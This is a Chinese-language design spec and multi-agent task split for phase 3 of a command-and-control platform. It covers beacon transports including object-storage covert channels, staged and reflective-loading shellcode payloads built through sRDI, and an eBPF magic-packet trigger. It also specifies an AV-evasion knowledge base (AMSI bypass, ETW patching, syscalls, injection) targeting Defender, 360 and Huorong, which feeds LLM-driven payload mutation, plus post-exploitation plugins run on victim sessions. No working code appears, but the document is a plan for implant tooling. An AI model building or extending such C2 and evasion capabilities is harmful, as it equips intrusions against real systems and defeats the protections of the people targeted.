| 文件/目录 | 所有者 |
|---|---|
| 契约/schema/types/api/sidebar/go.mod | 主会话（冻结） |
| `c2center/transport*.go`（新：传输框架）、`c2center/listener.go`（信道核心抽离传输载体）、`c2center/beacon.go`（模板扩展）、`c2center/protocol.go`（帧格式）、`server/c2_center.go`、`server/c2_api.go`、`db/c2.go`（监听器/会话 v3 列）、正向连接 API、对应测试 | **Agent T（传输）** |
| `c2center/payload_matrix.go`（新：组合校验+stager 模板+sRDI 转换）、`server/c2_build.go`（构建矩阵扩展）、`server/c2_payload_api.go`（新：载荷 v3 路由拆出）、`db/c2_payload_v3.go`（新：载荷新列）、eBPF 触发器产物、对应测试 | **Agent P（载荷矩阵）** |
| `c2center/evasion_kb.go`（新：知识库种子）、`server/c2_evasion_kb.go`（新：内置档案播种+提示词注入）、prompt 相关、对应测试 | **Agent E（免杀 KB）** |
| `db/c2_plugin.go`（新）、`server/c2_plugin.go`（新：插件 CRUD+运行链路+种子）、插件前端页、`c2_plugin_run` agent 工具 | **Agent G（插件）** |
| `web/src/app/(main)/function/c2/**` 其余 v3 增强（监听器协议/载荷矩阵 UI/正向连接入口）、`web/src/components/c2-*.tsx` | **Agent C（前端）** |

**跨 agent 编译耦合（钉死）**：Agent P 调用 T 的 `c2center.NewOutboundConn`（§18 冻结签名）做正向；T 不碰 P 的任何文件；G 的插件路由自注册进 `registerC2EvasionRoutes` 同款模式——`func (s *Server) registerC2PluginRoutes(mux *http.ServeMux)`，由 **Agent T 在 registerC2Routes 尾部追加调用**（一行）。

## 18. 传输框架与四传输（Agent T）

**信封与帧**：信封 JSON 结构（t/sid/ts/nc/d + meta）**一字不改**，AES-GCM 密钥/防重放逻辑复用。帧格式按载体：
- http（既有）/ws：body = base64(密文)，与一期逐字节兼容。
- tcp/kcp：4 字节 big-endian 长度 + 裸密文（nonce‖ct，无 base64）。半包/粘包必须处理。
- oss：无连接，对象即帧（§18.5）。

**框架重构（不动一期对外行为）**：把 listener.go 的「解密→session 解析→分发(reg/poll/res/file)→加密」核心抽成传输无关的处理核，HTTP/ws 共享；TCP/kcp 每连接一个处理循环；所有传输产出的会话行加 `transport` 字段（c2_sessions 新列，schema 已加：http/ws/tcp/kcp/oss）。

**四传输实现**：
1. **ws**：独立监听器类型（proto=ws），`POST /<url_path>/e` 处 GET upgrade（路径保持 /e 便于伪装），升级后同一处理核；ping/pong 保活。
2. **tcp**：`net.Listen` + 每连接帧循环；首帧必须是 reg。
3. **kcp**：`github.com/xtaci/kcp-go/v5`（go.mod 已加），Listen/帧循环同 tcp；监听器可选预共享 key 混淆（transport_config）。
4. **oss**：对象存储做双向队列——beacon 写 `<prefix>/<uid>/req` 拉取 `<prefix>/<uid>/resp`；平台侧每监听器一个 goroutine 定时 ListObjectsV2 轮询新会话/新请求（轮询间隔=sleep 语义）。**OSS REST 手写签名（OSS V1 HMAC-SHA1），不引 SDK**；endpoint/bucket/AK/SK 存 `c2_listeners.transport_config_enc`（secretbox 密封 JSON，接口永不回显，前端提交时写入）。callback 语义 = beacon 直连 OSS endpoint。
- **beacon 模板支持矩阵（freeze，前端按此禁选）**：http: ps1/bash/py/gosrc 全支持；ws: 全支持（ps1 走 ClientWebSocket，py 手写握手，bash 借 python）；tcp: 全支持（长度前缀帧）；**kcp: 仅 py/gosrc（bash 借 python），ps1 不支持**；oss: 全支持（手写签名）。模板与一期同文件延续，防重放/退避/meta 语义不变。
- **正向（bind）平台侧**：`POST /api/c2/sessions/connect` {listener_id, host, port} → 平台以该监听器的密钥/协议 **主动 dial** 目标（`c2center.NewOutboundConn(l *Listener, host, port string) (c2center.Conn, error)` 冻结签名，仅 tcp/kcp 支持）→ 走同一处理核建会话（transport=tcp/kcp，direction=bind 标注在会话 meta）。失败原样报错。正向 beacon 模板：启动即 Listen 目标端口等首帧 reg 握手。

## 19. 载荷矩阵（Agent P）

**产物维度**（c2_payloads 新列，schema 已加）：`artifact: script|exe|dll|shellcode|ebpf`、`direction: reverse|bind`、`staged bool`。**合法组合表（freeze，前后端同一份校验，后端 400 兜底）**：
- script：ps1/bash/py × reverse|bind × stageless（script 不做 staged）。
- exe：gosrc 编译 × reverse|bind × staged|stageless；staged exe = 小体积 stager 拉完整产物**落盘执行**（UI 标注 OPSEC 弱）。
- dll：gosrc c-shared 编译 × reverse|bind × stageless（导出 `Run` 入口，用法注明 rundll32 或加载器调用）。
- shellcode：dll 产物经 **sRDI 转换**（bootstrap shellcode 常量来自开源 sRDI 项目，BSD，文件头注明 attribution；Go 实现 patch 流程，指定调 `Run` 导出）× reverse|bind × staged|stageless；**staged shellcode = sRDI bootstrap 从信道拉 DLL stage 后反射加载**（一期交付核心）。
- ebpf：仅 linux × bind——tc/XDP 魔法包触发器源码工程 + 配套 bind beacon；**标 stretch**：优先交付源码工程+VPS 编译（clang 探测，无则明确报错），时间不够交付源码+构建文档。
- staging 通用机制：stager 与 stage 走同传输信道，信封协议加 `stage_get`/`stage_data` 消息对（t 扩两个值，协议向后兼容——旧 beacon 不发即不影响）；stage blob 投递复用 payload 文件存储。

**构建管线扩展**（在 server/c2_build.go 基础上）：exe/dll = VPS `go build`（dll 加 `-buildmode=c-shared`，产物 .dll/.so）+ 本机源码 zip 照旧；shellcode = dll 产物本地 sRDI 转换（纯 Go，不 exec）；所有组合走 c2_jobs(kind=build) 异步。组合校验失败 400 带原因；UI 矩阵由前端按 §22 渲染。

## 20. 免杀知识库（Agent E）

1. **全网搜集（WebSearch/WebFetch，先于编码）**：目标覆盖——Windows Defender 当前检测面（行为/AMSI/ETW/云查杀）、360/火绒/腾讯管家 检测侧重与已知干扰面、AMSI bypass/ETW patch/direct syscall/unhooking/DLL 侧载/进程注入技术谱系、加载器形态（sRDI/进程挖空/回调源）、Go 二进制特征与对抗（garble/资源/熵）、脚本类混淆（Invoke-Obfuscate 思路）。来源取公开防御研究与开源项目文档，**不复制样本代码**，沉淀为技术条目（technique/适用 AV/对抗要点/风险）。
2. **落地形态**：`c2center/evasion_kb.go` 内置知识条目 seeds（≥25 条，中英术语对照）+ 8 个内置免杀档案（source='builtin'，schema 枚举已扩）按 AV 分型（defender/360/huorong/generic × ps1/py/gosrc 主要组合）。`server/c2_evasion_kb.go`：启动幂等播种（照 SeedBuiltinToolsets 模式）+ **变形提示词注入**——按档案 target_av 拉对应知识条目摘要进系统提示（限长，避免撑爆上下文）。
3. 单测：seeds 完整性（档案引用的 KB key 必须存在）、提示词注入截断逻辑。

## 21. 插件板块（Agent G）

- **数据**：`c2_plugins` 表（schema 已加）：name/platform(windows|linux|macos|cross)/kind(script|binary)/language(ps1|sh|py)/entry(入口命令模板,{{param}} 占位)/content(脚本正文)/blob_path(二进制)/params_schema JSONB/description/builtin。
- **运行链路**：`POST /api/c2/sessions/{id}/plugins/{pid}/run` {params} → script：entry 模板按 params_schema 渲染（参数白名单校验，防注入——params 只允许进 {{param}} 占位）→ 建 c2_tasks(kind='plugin', input={plugin_id,params,command}) 走既有 shell 通道；binary：文件通道上传到目标临时目录→entry 执行（可带 after_clean 清理步骤）。运行记录即任务流水，actor 照旧 user/agent。
- **路由**：`GET/POST /api/c2/plugins`、`PUT/DELETE /api/c2/plugins/{id}`、`registerC2PluginRoutes`（T 在 registerC2Routes 尾部调用，一行）。
- **内置种子**（Go 播种，≥6 个跨平台教育性插件）：系统信息、进程列表、网络连接、计划任务枚举、持久化位置检查、安全软件进程探测（防御视角）。
- **agent 工具**：`c2_plugin_run`（stage=post 门禁照一期 c2_exec 模式，过拦截 Match）。
- **前端**（G 自带）：`/function/c2/plugins` 页（库管理四件套+内置徽标+新建/编辑 Dialog：平台/kind/语言/entry/content/params_schema）+ 会话详情新增「插件」Tab（选插件→参数表单（按 params_schema 渲染）→运行→结果进流水）。

## 22. 前端 v3（Agent C）

1. **监听器**：协议选择（http/ws/tcp/kcp/oss，kcp 标注「载荷仅 py/gosrc」）；oss 协议出现 endpoint/bucket/AK/SK 表单（提交后永不回显，编辑时显示「已配置」）；载体选择与协议组合校验（oss 无 bind_host）。
2. **载荷页矩阵**：格式→产物→方向→staged 四级联动选择器（按 §19 合法组合表禁选非法组合并给原因 tooltip）；shellcode 产物说明文案（sRDI）；staged 落盘版警示；eBPF 触发器选项（linux+bind 锁定）。
3. **会话**：列表/详情显示 transport 与 bind 方向徽标；详情头部「正向连接」按钮（弹窗 host/port→`c2ConnectBind`）。
4. 插件页与插件 Tab 由 Agent G 交付，C 不做；G 与 C 的组件若冲突，以 G 的 c2-plugin-* 命名空间为准。

## 23. 三期验收（集成阶段主会话执行）

1. vet 四包干净；`go test ./c2center/ ./vpscenter/ ./db/` 全绿（含各新用例）；tsc 零错误；全量构建成功。
2. 8799 冒烟：ws/tcp 监听器各起一个→对应 beacon 模板本机上线→shell 往返（TCP 帧解析实测）；kcp/oss 以单测+创建/启停 API 为准（无外部 OSS 凭据则验错误路径）；正向 connect API 对本机 bind beacon 实测建会话；shellcode 产物经 VPS 构建管线生成（有 go 环境则实测 sha256/大小合理，无则验 error 路径）；插件运行一个内置插件到真实会话拿回结果；免杀内置档案与 KB 注入可见。
3. 前端：矩阵联动/协议选择/正向连接入口/插件页全部可用，一期二期页面零回归。

---

# 三期补丁 A（v3.1，2026-09-26 冻结）：载荷↔免杀联动 + 监听器测活

## 24A. 载荷生成联动免杀（缺口：三期的 createC2Payload 不处理 evasion_profile_id）

- **后端**：`POST /api/c2/payloads` 收到 `evasion_profile_id>0` 时：
  - artifact=script（ps1/bash/py）：**不走直出渲染**，改走免杀变形作业管线（与 `/api/c2/evasion/generate` 完全同一条链路：建 c2_jobs(kind=evasion) + stage=post 监看任务 + LLM 变形 + 静态自测），实现为共享 helper（两个端点共用，防两份逻辑漂移）；同档案+监听器已有 running job → 409。响应 `{job_id}`（前端已有轮询 UI）。
  - artifact=exe/dll/shellcode/ebpf：400 明确提示「编译型产物暂不支持档案变形（后续走 garble/构建混淆），请改选 script 或到免杀工作台处理脚本载荷」。
  - 档案校验：存在性 + `payload_format` 与请求 format 一致（不一致 400）。
- **前端**（payloads 页）：生成表单加「免杀档案」下拉（默认「不使用（直出）」；可选档案按当前 format 过滤，来源徽标 builtin/manual/llm）；选中档案且产物=script 时提交携带 evasion_profile_id，响应带 job_id 时复用既有 3s 作业轮询进度条；选中档案且产物≠script 时前端预先禁用提交并提示原因（与后端 400 文案同义）。

## 24B. 监听器测活

- **后端**：`POST /api/c2/listeners/{id}/check` → `{ok: bool, latency_ms: number|null, checks:[{item, ok, detail}]}`：
  - local 载体：TCP dial bind 地址（运行中才有意义；未运行 → ok=false detail=「监听器未运行」）；http/ws 协议追加一次 `GET /<url_path>/e`（任何 HTTP 响应=通，包括 400/404/426——探测的是端口与服务活性，不是合法信封）。
  - vps 载体：dial `vps机器公网host:remote_port`（端到端验证 SSH 转发链）+ SSH 连接健康；失败 detail 区分「SSH 断开/转发端口拒绝/超时」。
  - oss：签名 GetBucket 探测（验证 endpoint/bucket/AK/SK 全链）；未配置 → ok=false。
  - kcp：进程级检查（监听器 goroutine 存活 + UDP 本地端口绑定），detail 注明「UDP 无连接，进程级探活」。
  - 全部检查限时 5s/项，永不阻塞；结果只返回不落库。
- **前端**（listeners 页）：行操作加「测活」按钮（运行中才可点；未运行置灰）→ 结果 Dialog/内联：总 ok 徽标 + latency + 逐项 checks 列表（ok 绿/detail 红字）；测活期间按钮转圈。

## 24C. 验收

1. 载荷页选档案生成 script 载荷 → 作业出现 →（配 LLM 的实例）产出带 evasion_profile_id 的载荷行；不选档案行为与三期完全一致。
2. 监听器测活：local/vps 载体实测通断与延迟；kcp/oss 给出对应级别的检查结果；未运行监听器给明确提示。
3. tsc 零错误；vet 四包干净；既有测试零回归。
